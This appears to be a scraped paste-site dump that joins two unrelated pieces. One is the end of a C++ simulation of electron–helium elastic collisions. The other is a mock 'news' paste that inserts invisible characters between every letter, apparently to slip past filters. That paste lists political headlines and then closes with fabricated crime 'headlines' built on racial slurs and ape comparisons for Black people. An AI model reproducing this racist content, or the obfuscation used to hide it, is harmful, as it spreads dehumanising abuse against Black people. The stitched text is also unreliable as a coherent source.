        nu_max_temp = (N_He/Volume)*elastic_vec[i] * sqrt(2.0*(i*bin_width + bin_width/2.0)*q/m_e);
        file7 << i << "" "" << nu_max_temp << ""\n"";
        if (nu_max_temp > nu_max)
            nu_max = nu_max_temp;
    }
    // -----calculating nu-max for null-collision method ends ------------////

    //----- calculating nu-average from our electron distribution starts---------///
    for (int i = 0; i < N; i++){
        double bin_center = Emin + (i + 0.5) * bin_width;
        file9 << bin_center << "" "" << (N_He/Volume)*elastic_vec[i] * sqrt(2.0*bin_center*q/m_e)*static_cast<double>(histo_random[i])/(electrons.size()*bin_width) << ""\n"";
    }
    //----- calculating nu-average from our electron distribution ends ---------///    

    std::cout << nu_max << ""\n"";

    double dt = 0.1/nu_max;   // minimum should be 0.1/nu_max to get acceptable numerical error range see Vahedi Surrendra 1995
    double steps = static_cast<int>(time/dt);

//    std::cout << steps << ""\n"";

    //using  null-collision technique, getting the number of particles colliding each step: P_collision = 1 - exp(-nu_max*dt)
    int Ne_collided = (1.0-exp(-1.0*dt*nu_max))*n_e;
//    int Ne_collided = n_e*0.98;  // in case I want to check smth


    // Generate shuffled list of electron indices
    std::vector<int> electron_indices(n_e);
    std::iota(electron_indices.begin(), electron_indices.end(), 0); // fill with index
    std::shuffle(electron_indices.begin(), electron_indices.end(), gen); // shuffle the indexes    
    int reshuffle_interval = 1;
    int print_interval = 100;

    for (int t = 0; t < steps; t++){
        std::cout << ""timestep remains: "" << steps - t << ""\n"";

        //reshuffle the indices
        if (t % reshuffle_interval == 0) {
            std::shuffle(electron_indices.begin(), electron_indices.end(), gen);
        }

        // setting flags to false each timestep
        for (auto& e : electrons) e.collided = false;

        int collision_counter = 0;


        for (int idx : electron_indices) {

            if (collision_counter >= Ne_collided) break; // quit if reached all collisions

            Electron& e = electrons[idx];
            if (e.collided) continue;  // Skip already collided electrons

            double electron_energy = e.energy;
            int bin_energy = static_cast<int>(electron_energy / bin_width);
            double nu_elastic = (N_He/Volume) * elastic_vec[bin_energy] * sqrt(2.0*electron_energy*q/m_e);

            if (dis(gen) < nu_elastic/nu_max) {

                // ----   Collision energy redistribution module

                // electron particle X Y Z initial velocities and energy
                double V0_x_1 = e.vx;
                double V0_y_1 = e.vy;
                double V0_z_1 = e.vz;

                // neutral particle X Y Z initial velocities

                // int k = neutral_pair(gen);

                // double V0_x_2 = neutrals[k].vx;
                // double V0_y_2 = neutrals[k].vy;
                // double V0_z_2 = neutrals[k].vz;

                // randomize particles each collision
                NeutralParticle tmp_neutral;
                tmp_neutral.initialize(gen, dis, maxwell_neutral);
                double V0_x_2 = tmp_neutral.vx;
                double V0_y_2 = tmp_neutral.vy;
                double V0_z_2 = tmp_neutral.vz;

                // initial relative velocity X Y Z (must be equal to final relative velocity in center-of-mass frame) 

                double V0_rel_x = (V0_x_1 - V0_x_2);
                double V0_rel_y = (V0_y_1 - V0_y_2);
                double V0_rel_z = (V0_z_1 - V0_z_2);

                double V0_rel = sqrt(V0_rel_x*V0_rel_x + V0_rel_y*V0_rel_y + V0_rel_z*V0_rel_z);

                // center-of-mass frame initial velocity (magnitude of it must be equal to the counterpart in this frame)

                double V_cm_x = (m_e*V0_x_1 + M_n*V0_x_2)/(m_e + M_n);
                double V_cm_y = (m_e*V0_y_1 + M_n*V0_y_2)/(m_e + M_n);
                double V_cm_z = (m_e*V0_z_1 + M_n*V0_z_2)/(m_e + M_n);                    

                // generating random variables to calculate random direction of center-of-mass after the collision

                double R1 = dis(gen);
                double R2 = dis(gen);

                // calculating spherical angles for center-of-mass random direction
                double theta = acos(1.0- 2.0*R1);
                double phi = 2*M_PI*R2;

                //calculating final relative velocity with random direction

                double V_rel_x = V0_rel*sin(theta)*cos(phi);
                double V_rel_y = V0_rel*sin(theta)*sin(phi);
                double V_rel_z = V0_rel*cos(theta);

                double V_rel = sqrt(V_rel_x*V_rel_x + V_rel_y*V_rel_y + V_rel_z*V_rel_z);

                //calculating final velocity of electron

                double V_x_1 = V_cm_x + V_rel_x * (M_n/(m_e + M_n));
                double V_y_1 = V_cm_y + V_rel_y * (M_n/(m_e + M_n));
                double V_z_1 = V_cm_z + V_rel_z * (M_n/(m_e + M_n));

                double V_1 = sqrt(V_x_1*V_x_1 + V_y_1*V_y_1 + V_z_1*V_z_1);

                //updating electron energy and velocities
                
                e.energy = m_e*V_1*V_1/(2.0*q);
                e.vx = V_x_1;
                e.vy = V_y_1;
                e.vz = V_z_1;

                collision_counter++;

                e.collided = true;
            }             
        }
                // if (t%print_interval == 0){
                // // open datafiles to write each time step to see evolution
                // std::ostringstream filename;
                // filename << ""data/distribution_"" << std::setw(4) << std::setfill('0') << t << "".dat"";

                // std::ofstream file(filename.str());
                // if (!file.is_open()){
                // std::cerr << ""Error opening file: "" << filename.str() << std::endl;
                // return 1;
                // }
                // // end opening datafiles for each timestep
                
                // // creating histogram each timestep
                // for (int i = 0; i < n_e; i++){
                //     int bin = (int)( (electrons[i].energy - Emin)/bin_width );
                //     if (bin >=0 && bin < N)
                //     histo_maxwell[bin]++;
                // }

                // // writing data each time step
                // for (int i = 0; i < N; i++){
                //     double bin_start = Emin + i*bin_width;
                //     file << i*bin_width << "" "" <<  static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // later need to divide by total partcles number to get normalized distribution
                //     histo_maxwell[i] = 0;
                // }

                // file.close();
                // // end writing data each timestep

                // calculating mean energy 
                double total_energy = 0.0;
                for (const auto& e : electrons) total_energy += e.energy;
                double mean_energy = total_energy / n_e;
                file8 << t*dt << "" "" << mean_energy << ""\n"";                
            }

    // ----- final electron energies distribution begins
    for (int i = 0; i < n_e; i++){

        file2 << i << "" "" << electrons[i].energy << ""\n"";

        int bin = (int)( (electrons[i].energy - Emin)/bin_width );
        if (bin >=0 && bin < histo_maxwell.size())
            histo_maxwell[bin]++;
    }

    int check = 0;
    for (int i = 0; i < histo_maxwell.size(); i++){
        check += histo_maxwell[i];
        double bin_center = Emin + (i + 0.5) * bin_width;
        file4 << bin_center << "" "" <<  bin_center*static_cast<double>(histo_maxwell[i])/(electrons.size()*bin_width) << ""\n""; // getting f(E)*E
    }
    std::cout << ""Total # of electrons in histo: "" << check << ""\n"";

    // ----- final electron energies distribution begins    


    file0.close();
    file1.close();
    file2.close();
    file3.close();
    file4.close();
    file5.close();
    file6.close();
    file7.close();
    file8.close();
    file9.close();

    clock_t end = clock();

    double elapsed = (double)(end - start) / CLOCKS_PER_SEC;

    std::cout << ""Ne collided each timesteps:"" << Ne_collided << ""\n"";
    std::cout << ""Energies written successfuly\n"";
    std::cout << ""Elapsed time: %f seconds "" << elapsed << ""\n"";


    return 0;

}"
1EMEQz0M,News April1 25,Newscaster_Ned,Email,Tuesday 1st of April 2025 05:11:04 PM CDT,".‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎1‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎2‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎T‎e‎s‎t‎ ‎3‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎
.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎T‎e‎s‎t‎ ‎c‎o‎m‎p‎l‎e‎t‎e‎.‎

A‎l‎r‎i‎g‎h‎t‎,‎ ‎f‎o‎l‎k‎s‎.‎ ‎T‎o‎d‎a‎y‎'‎s‎ ‎n‎e‎w‎s‎ ‎i‎s‎ ‎g‎o‎n‎n‎a‎ ‎b‎e‎ ‎a‎ ‎b‎i‎t‎ ‎d‎i‎f‎f‎e‎r‎e‎n‎t‎.‎ ‎I‎'‎m‎ ‎g‎o‎n‎n‎a‎ ‎b‎e‎ ‎t‎a‎k‎i‎n‎g‎ ‎i‎n‎ ‎s‎o‎m‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎e‎m‎a‎i‎l‎s‎ ‎a‎n‎d‎ ‎a‎n‎s‎w‎e‎r‎i‎n‎g‎ ‎t‎h‎e‎m‎.‎

W‎e‎l‎l‎.‎ ‎T‎h‎a‎t‎ ‎d‎o‎e‎s‎ ‎i‎t‎.‎ ‎B‎a‎c‎k‎ ‎t‎o‎ ‎t‎h‎e‎ ‎r‎e‎g‎u‎l‎a‎r‎ ‎n‎e‎w‎s‎.‎
A‎t‎ ‎L‎e‎a‎s‎t‎ ‎4‎ ‎I‎n‎j‎u‎r‎e‎d‎ ‎A‎f‎t‎e‎r‎ ‎D‎r‎i‎v‎e‎r‎ ‎C‎r‎a‎s‎h‎e‎s‎ ‎S‎t‎r‎i‎k‎i‎n‎g‎ ‎P‎e‎d‎e‎s‎t‎r‎i‎a‎n‎s‎ ‎i‎n‎ ‎B‎o‎s‎t‎o‎n‎
G‎O‎P‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎ ‎P‎u‎s‎h‎i‎n‎g‎ ‎t‎o‎ ‎P‎r‎o‎h‎i‎b‎i‎t‎ ‎S‎t‎a‎t‎e‎-‎L‎e‎v‎e‎l‎ ‎E‎x‎c‎i‎s‎e‎ ‎T‎a‎x‎e‎s‎ ‎o‎n‎ ‎G‎u‎n‎s‎
U‎.‎N‎.‎ ‎U‎r‎g‎e‎s‎ ‎C‎a‎n‎a‎d‎a‎ ‎t‎o‎ ‎L‎i‎m‎i‎t‎ ‎K‎i‎l‎l‎i‎n‎g‎s‎ ‎U‎n‎d‎e‎r‎ ‎E‎u‎t‎h‎a‎n‎a‎s‎i‎a‎ ‎P‎r‎o‎g‎r‎a‎m‎ ‎'‎M‎A‎I‎D‎'‎
M‎y‎s‎t‎a‎l‎:‎ ‎E‎v‎e‎r‎y‎ ‎L‎a‎w‎ ‎P‎a‎s‎s‎e‎d‎ ‎B‎e‎f‎o‎r‎e‎ ‎1‎9‎6‎5‎ ‎V‎o‎t‎i‎n‎g‎ ‎R‎i‎g‎h‎t‎s‎ ‎A‎c‎t‎ ‎U‎n‎c‎o‎n‎s‎t‎i‎t‎u‎t‎i‎o‎n‎a‎l‎
H‎o‎a‎x‎ ‎D‎e‎b‎u‎n‎k‎e‎d‎:‎ ‎C‎l‎a‎i‎m‎ ‎B‎l‎a‎c‎k‎ ‎B‎a‎b‎i‎e‎s‎ ‎M‎o‎r‎e‎ ‎L‎i‎k‎e‎l‎y‎ ‎t‎o‎ ‎D‎i‎e‎ ‎I‎f‎ ‎D‎o‎c‎s‎ ‎W‎h‎i‎t‎e‎
G‎o‎l‎d‎b‎e‎r‎g‎:‎ ‎T‎r‎u‎m‎p‎ ‎A‎t‎t‎a‎c‎k‎s‎ ‎o‎n‎ ‎F‎r‎e‎e‎ ‎S‎p‎e‎e‎c‎h‎ ‎'‎H‎a‎v‎e‎ ‎N‎o‎t‎h‎i‎n‎g‎ ‎t‎o‎ ‎D‎o‎ ‎w‎i‎t‎h‎ ‎R‎e‎a‎l‎i‎t‎y‎'‎
M‎i‎l‎l‎e‎y‎'‎s‎ ‎S‎h‎a‎d‎o‎w‎ ‎L‎o‎o‎m‎e‎d‎ ‎L‎a‎r‎g‎e‎ ‎a‎t‎ ‎C‎o‎n‎f‎i‎r‎m‎a‎t‎i‎o‎n‎ ‎H‎e‎a‎r‎i‎n‎g‎ ‎f‎o‎r‎ ‎J‎o‎i‎n‎t‎ ‎C‎h‎i‎e‎f‎s‎ ‎C‎h‎a‎i‎r‎
M‎a‎n‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎A‎l‎l‎e‎g‎e‎d‎l‎y‎ ‎T‎o‎s‎s‎i‎n‎g‎ ‎N‎a‎i‎l‎s‎ ‎i‎n‎ ‎D‎r‎i‎v‎e‎w‎a‎y‎s‎ ‎o‎f‎ ‎T‎r‎u‎m‎p‎ ‎S‎u‎p‎p‎o‎r‎t‎e‎r‎s‎
D‎e‎m‎s‎ ‎A‎p‎p‎o‎i‎n‎t‎e‎d‎ ‎9‎2‎%‎ ‎o‎f‎ ‎J‎u‎d‎g‎e‎s‎ ‎B‎l‎o‎c‎k‎i‎n‎g‎ ‎T‎r‎u‎m‎p‎ ‎A‎g‎e‎n‎d‎a‎:‎ ‎'‎J‎u‎d‎i‎c‎i‎a‎l‎ ‎C‎o‎u‎p‎ ‎D‎'‎E‎t‎a‎t‎'‎
G‎A‎ ‎G‎o‎v‎.‎ ‎E‎x‎p‎e‎c‎t‎e‎d‎ ‎t‎o‎ ‎S‎i‎g‎n‎ ‎'‎R‎i‎l‎e‎y‎ ‎G‎a‎i‎n‎e‎s‎ ‎A‎c‎t‎'‎ ‎B‎a‎n‎n‎i‎n‎g‎ ‎M‎a‎l‎e‎ ‎f‎r‎o‎m‎ ‎G‎i‎r‎l‎s‎'‎ ‎S‎p‎o‎r‎t‎s‎
L‎e‎a‎v‎i‎t‎t‎ ‎o‎n‎ ‎E‎v‎e‎ ‎o‎f‎ ‎R‎e‎c‎i‎p‎r‎o‎c‎a‎l‎ ‎T‎a‎r‎i‎f‎f‎s‎:‎ ‎D‎a‎y‎s‎ ‎o‎f‎ ‎R‎i‎p‎p‎i‎n‎g‎ ‎O‎f‎f‎ ‎U‎.‎S‎.‎ ‎'‎A‎r‎e‎ ‎O‎v‎e‎r‎'‎
D‎e‎m‎o‎c‎r‎a‎t‎ ‎D‎e‎m‎a‎n‎d‎s‎ ‎T‎r‎u‎m‎p‎ ‎'‎R‎e‎t‎u‎r‎n‎'‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎t‎o‎ ‎U‎.‎S‎.‎
M‎o‎n‎i‎c‎a‎ ‎M‎c‎N‎u‎t‎t‎ ‎C‎l‎a‎i‎m‎s‎ ‎C‎a‎i‎t‎l‎i‎n‎ ‎C‎l‎a‎r‎k‎ ‎i‎s‎ ‎O‎n‎l‎y‎ ‎P‎o‎p‎u‎l‎a‎r‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎S‎h‎e‎'‎s‎ ‎W‎h‎i‎t‎e‎
T‎r‎u‎m‎p‎'‎s‎ ‎I‎R‎S‎ ‎N‎e‎a‎r‎s‎ ‎D‎e‎a‎l‎ ‎w‎i‎t‎h‎ ‎I‎C‎E‎ ‎a‎s‎ ‎D‎O‎G‎E‎ ‎R‎e‎p‎o‎r‎t‎e‎d‎l‎y‎ ‎F‎i‎n‎d‎s‎ ‎M‎i‎l‎l‎i‎o‎n‎s‎ ‎i‎n‎ ‎F‎r‎a‎u‎d‎
T‎a‎i‎w‎a‎n‎ ‎A‎c‎c‎u‎s‎e‎s‎ ‎C‎h‎i‎n‎a‎ ‎o‎f‎ ‎U‎s‎i‎n‎g‎ ‎F‎a‎k‎e‎ ‎C‎o‎m‎p‎a‎n‎i‎e‎s‎ ‎t‎o‎ ‎H‎i‎r‎e‎ ‎I‎n‎t‎e‎l‎ ‎S‎t‎a‎f‎f‎e‎r‎s‎
G‎e‎t‎ ‎A‎l‎l‎ ‎B‎r‎e‎i‎t‎b‎a‎r‎t‎ ‎N‎e‎w‎s‎ ‎H‎e‎r‎e‎
H‎o‎m‎e‎P‎a‎g‎e‎
D‎e‎m‎s‎ ‎D‎e‎m‎a‎n‎d‎ ‎T‎r‎u‎m‎p‎ ‎R‎e‎t‎u‎r‎n‎ ‎D‎e‎p‎o‎r‎t‎e‎d‎ ‎G‎a‎n‎g‎ ‎M‎e‎m‎b‎e‎r‎s‎ ‎t‎o‎ ‎U‎S‎A‎
S‎A‎N‎ ‎S‎A‎L‎V‎A‎D‎O‎R‎,‎ ‎E‎L‎ ‎S‎A‎L‎V‎A‎D‎O‎R‎ ‎-‎ ‎M‎A‎R‎C‎H‎ ‎3‎1‎:‎ ‎(‎-‎-‎-‎-‎E‎D‎I‎T‎O‎R‎I‎A‎L‎ ‎U‎S‎E‎ ‎O‎N‎L‎Y‎ ‎-‎ ‎M‎A‎N‎D‎A‎T‎O‎R‎Y‎ ‎C‎R‎E‎D‎I‎T‎ ‎-‎ ‎'‎E‎
R‎e‎p‎.‎ ‎J‎a‎m‎i‎e‎ ‎R‎a‎s‎k‎i‎n‎ ‎i‎s‎ ‎d‎e‎m‎a‎n‎d‎i‎n‎g‎ ‎t‎h‎a‎t‎ ‎P‎r‎e‎s‎i‎d‎e‎n‎t‎ ‎D‎o‎n‎a‎l‎d‎ ‎T‎r‎u‎m‎p‎ ‎f‎l‎y‎ ‎h‎u‎n‎d‎r‎e‎d‎s‎ ‎o‎f‎ ‎s‎u‎s‎p‎e‎c‎t‎e‎d‎ ‎g‎a‎n‎g‎ ‎m‎e‎m‎b‎e‎r‎s‎ ‎b‎a‎c‎k‎ ‎t‎o‎ ‎t‎h‎e‎ ‎U‎n‎i‎t‎e‎d‎ ‎S‎t‎a‎t‎e‎s‎.‎

L‎e‎n‎a‎ ‎D‎u‎n‎h‎a‎m‎ ‎R‎a‎i‎l‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎‘‎H‎o‎r‎r‎i‎f‎i‎c‎ ‎G‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎A‎b‎u‎s‎e‎s‎’‎ ‎a‎t‎ ‎T‎r‎a‎n‎s‎ ‎V‎i‎s‎i‎b‎i‎l‎i‎t‎y‎ ‎R‎a‎l‎l‎y‎:‎ ‎‘‎T‎r‎a‎n‎s‎ ‎L‎i‎b‎e‎
L‎e‎n‎a‎ ‎D‎u‎n‎h‎a‎m‎ ‎R‎a‎i‎l‎s‎ ‎A‎g‎a‎i‎n‎s‎t‎ ‎‘‎H‎o‎r‎r‎i‎f‎i‎c‎ ‎G‎o‎v‎e‎r‎n‎m‎e‎n‎t‎ ‎A‎b‎u‎s‎e‎s‎’‎ ‎a‎t‎ ‎T‎r‎a‎n‎s‎ ‎R‎a‎l‎l‎y‎
1‎,‎2‎7‎9‎
E‎S‎P‎N‎’‎s‎ ‎M‎o‎n‎i‎c‎a‎ ‎M‎c‎N‎u‎t‎t‎ ‎C‎l‎a‎i‎m‎s‎ ‎C‎a‎i‎t‎l‎i‎n‎ ‎C‎l‎a‎r‎k‎ ‎i‎s‎ ‎P‎o‎p‎u‎l‎a‎r‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎S‎h‎e‎’‎s‎ ‎a‎ ‎‘‎W‎h‎i‎t‎e‎ ‎G‎i‎r‎l‎ ‎
M‎o‎n‎i‎c‎a‎ ‎M‎c‎N‎u‎t‎t‎ ‎C‎l‎a‎i‎m‎s‎ ‎C‎a‎i‎t‎l‎i‎n‎ ‎C‎l‎a‎r‎k‎ ‎i‎s‎ ‎O‎n‎l‎y‎ ‎P‎o‎p‎u‎l‎a‎r‎ ‎B‎e‎c‎a‎u‎s‎e‎ ‎S‎h‎e‎'‎s‎ ‎W‎h‎i‎t‎e‎
1‎7‎1‎
R‎e‎p‎o‎r‎t‎:‎ ‎D‎e‎m‎o‎c‎r‎a‎t‎ ‎S‎e‎n‎.‎ ‎C‎o‎r‎y‎ ‎B‎o‎o‎k‎e‎r‎’‎s‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎C‎a‎r‎r‎y‎i‎n‎g‎ ‎G‎u‎n‎ ‎o‎n‎ ‎C‎a‎p‎i‎t‎o‎l‎ ‎G‎r‎o‎u‎n‎d‎s‎ ‎a‎s‎ ‎S‎
S‎e‎n‎.‎ ‎C‎o‎r‎y‎ ‎B‎o‎o‎k‎e‎r‎'‎s‎ ‎S‎t‎a‎f‎f‎e‎r‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎f‎o‎r‎ ‎C‎a‎r‎r‎y‎i‎n‎g‎ ‎G‎u‎n‎ ‎o‎n‎ ‎C‎a‎p‎i‎t‎o‎l‎ ‎G‎r‎o‎u‎n‎d‎s‎
6‎6‎3‎
J‎a‎y‎a‎p‎a‎l‎:‎ ‎W‎e‎’‎r‎e‎ ‎T‎r‎a‎i‎n‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎t‎o‎ ‎T‎a‎k‎e‎ ‎D‎o‎w‎n‎ ‎P‎o‎t‎e‎n‎t‎i‎a‎l‎ ‎T‎r‎u‎m‎p‎ ‎D‎i‎c‎t‎a‎t‎o‎r‎s‎h‎i‎p‎
J‎a‎y‎a‎p‎a‎l‎:‎ ‎W‎e‎'‎r‎e‎ ‎T‎r‎a‎i‎n‎i‎n‎g‎ ‎A‎m‎e‎r‎i‎c‎a‎n‎s‎ ‎t‎o‎ ‎T‎a‎k‎e‎ ‎D‎o‎w‎n‎ ‎P‎o‎t‎e‎n‎t‎i‎a‎l‎ ‎T‎r‎u‎m‎p‎ ‎D‎i‎c‎t‎a‎t‎o‎r‎s‎h‎i‎p‎
4‎,‎6‎8‎8‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎P‎r‎e‎v‎i‎e‎w‎s‎ ‎D‎O‎G‎E‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎W‎e‎a‎l‎t‎h‎ ‎o‎f‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎:‎ ‎‘‎H‎o‎w‎ ‎D‎o‎ ‎t‎h‎e‎y‎ ‎B‎e‎c‎o‎m‎e‎ ‎R‎i‎c‎h‎?‎’‎
E‎l‎o‎n‎ ‎M‎u‎s‎k‎ ‎P‎r‎e‎v‎i‎e‎w‎s‎ ‎D‎O‎G‎E‎ ‎L‎o‎o‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎W‎e‎a‎l‎t‎h‎ ‎o‎f‎ ‎L‎a‎w‎m‎a‎k‎e‎r‎s‎
6‎,‎1‎6‎7‎
H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎o‎f‎ ‎N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎ ‎R‎e‎p‎u‎b‎l‎i‎c‎a‎n‎ ‎P‎a‎r‎t‎y‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎‘‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎A‎r‎s‎o‎n‎’‎
N‎e‎w‎ ‎M‎e‎x‎i‎c‎o‎ ‎G‎O‎P‎ ‎H‎e‎a‎d‎q‎u‎a‎r‎t‎e‎r‎s‎ ‎T‎a‎r‎g‎e‎t‎e‎d‎ ‎i‎n‎ ‎'‎D‎e‎l‎i‎b‎e‎r‎a‎t‎e‎ ‎A‎c‎t‎ ‎o‎f‎ ‎A‎r‎s‎o‎n‎'‎
4‎,‎7‎6‎5‎
C‎a‎n‎a‎d‎a‎ ‎S‎l‎a‎p‎s‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎F‎l‎a‎m‎e‎t‎h‎r‎o‎w‎e‎r‎s‎,‎ ‎M‎a‎n‎a‎t‎e‎e‎ ‎M‎e‎a‎t‎,‎ ‎F‎a‎k‎e‎ ‎B‎e‎a‎r‎d‎s‎,‎ ‎a‎n‎d‎ ‎L‎i‎v‎e‎ ‎M‎o‎n‎k‎e‎y‎s‎ ‎i‎n‎ ‎R‎e‎s‎p‎o‎n‎s‎e‎ ‎t‎o‎ ‎T‎
C‎a‎n‎a‎d‎a‎ ‎S‎l‎a‎p‎s‎ ‎T‎a‎r‎i‎f‎f‎s‎ ‎o‎n‎ ‎F‎l‎a‎m‎e‎t‎h‎r‎o‎w‎e‎r‎s‎,‎ ‎M‎a‎n‎a‎t‎e‎e‎ ‎M‎e‎a‎t‎,‎ ‎F‎a‎k‎e‎ ‎B‎e‎a‎r‎d‎s‎
3‎,‎9‎0‎3‎
D‎e‎m‎ ‎S‎e‎n‎.‎ ‎C‎o‎r‎y‎ ‎B‎o‎o‎k‎e‎r‎ ‎S‎p‎e‎a‎k‎i‎n‎g‎ ‎o‎n‎ ‎S‎e‎n‎a‎t‎e‎ ‎F‎l‎o‎o‎r‎ ‎f‎o‎r‎ ‎M‎o‎r‎e‎ ‎T‎h‎a‎n‎ ‎1‎3‎ ‎H‎o‎u‎r‎s‎:‎
D‎e‎m‎ ‎S‎e‎n‎.‎ ‎C‎o‎r‎y‎ ‎B‎o‎o‎k‎e‎r‎ ‎S‎p‎e‎a‎k‎i‎n‎g‎ ‎o‎n‎ ‎S‎e‎n‎a‎t‎e‎ ‎F‎l‎o‎o‎r‎ ‎F‎o‎r‎ ‎M‎o‎r‎e‎ ‎T‎h‎a‎n‎ ‎1‎3‎ ‎H‎o‎u‎r‎s‎
3‎,‎2‎1‎6‎
P‎o‎l‎i‎c‎e‎:‎ ‎K‎a‎n‎s‎a‎s‎ ‎M‎a‎n‎ ‎V‎a‎n‎d‎a‎l‎i‎z‎e‎d‎ ‎D‎i‎s‎a‎b‎l‎e‎d‎ ‎T‎e‎e‎n‎’‎s‎ ‎T‎e‎s‎l‎a‎
P‎o‎l‎i‎c‎e‎:‎ ‎K‎a‎n‎s‎a‎s‎ ‎M‎a‎n‎ ‎V‎a‎n‎d‎a‎l‎i‎z‎e‎d‎ ‎D‎i‎s‎a‎b‎l‎e‎d‎ ‎T‎e‎e‎n‎'‎s‎ ‎T‎e‎s‎l‎a‎
2‎3‎0‎
I‎r‎a‎n‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎S‎t‎r‎a‎t‎e‎g‎i‎c‎ ‎U‎.‎S‎.‎ ‎B‎a‎s‎e‎ ‎i‎n‎ ‎I‎n‎d‎i‎a‎n‎ ‎O‎c‎e‎a‎n‎
I‎r‎a‎n‎ ‎T‎h‎r‎e‎a‎t‎e‎n‎s‎ ‎S‎t‎r‎i‎k‎e‎ ‎o‎n‎ ‎S‎t‎r‎a‎t‎e‎g‎i‎c‎ ‎U‎.‎S‎.‎ ‎B‎a‎s‎e‎ ‎i‎n‎ ‎I‎n‎d‎i‎a‎n‎ ‎O‎c‎e‎a‎n‎

M‎o‎n‎k‎e‎y‎ ‎M‎a‎r‎i‎n‎e‎ ‎G‎e‎t‎s‎ ‎L‎i‎f‎e‎ ‎A‎f‎t‎e‎r‎ ‎K‎i‎l‎l‎i‎n‎g‎ ‎H‎i‎s‎ ‎M‎u‎d‎s‎h‎a‎r‎k‎ ‎O‎c‎e‎a‎n‎s‎i‎d‎e‎ ‎W‎i‎f‎e‎.‎

T‎h‎e‎y‎ ‎a‎r‎g‎u‎e‎d‎ ‎a‎b‎o‎u‎t‎ ‎m‎o‎u‎n‎t‎i‎n‎g‎ ‎b‎i‎l‎l‎s‎ ‎o‎f‎ ‎c‎o‎u‎r‎s‎e‎.‎


N‎o‎r‎t‎h‎ ‎M‎i‎a‎m‎i‎ ‎N‎i‎g‎f‎o‎r‎m‎e‎ ‎R‎a‎p‎e‎s‎ ‎1‎0‎-‎Y‎e‎a‎r‎-‎O‎l‎d‎ ‎G‎i‎r‎l‎.‎


N‎e‎g‎r‎o‎ ‎N‎F‎L‎ ‎P‎l‎a‎y‎e‎r‎ ‎M‎i‎c‎h‎a‎e‎l‎ ‎I‎r‎v‎i‎n‎ ‎I‎n‎v‎e‎s‎t‎i‎g‎a‎t‎e‎d‎ ‎f‎o‎r‎ ‎S‎e‎x‎u‎a‎l‎ ‎A‎s‎s‎a‎u‎l‎t‎.‎


G‎o‎r‎i‎l‎l‎a‎ ‎A‎r‎r‎e‎s‎t‎e‎d‎ ‎i‎n‎ ‎K‎i‎n‎g‎s‎ ‎C‎o‎u‎n‎t‎y‎ ‎A‎f‎t‎e‎r‎ ‎B‎r‎e‎a‎k‎i‎n‎g‎ ‎i‎n‎t‎o‎ ‎W‎o‎m‎a‎n‎'‎s‎ ‎H‎o‎u‎s‎e‎ ‎a‎n‎d‎ ‎R‎a‎p‎i‎n‎g‎ ‎H‎e‎r‎.‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎ ‎W‎e‎a‎t‎h‎e‎r‎.‎

T‎o‎n‎i‎g‎h‎t‎
M‎o‎s‎t‎l‎y‎ ‎C‎l‎o‎u‎d‎y‎/‎W‎i‎n‎d‎
-‎-‎
/‎7‎1‎°‎
1‎7‎%‎
 ‎S‎ ‎2‎1‎ ‎m‎p‎h‎
T‎u‎e‎ ‎0‎1‎ ‎|‎ ‎N‎i‎g‎h‎t‎
7‎1‎°‎
1‎7‎%‎
S‎ ‎2‎1‎ ‎m‎p‎h‎
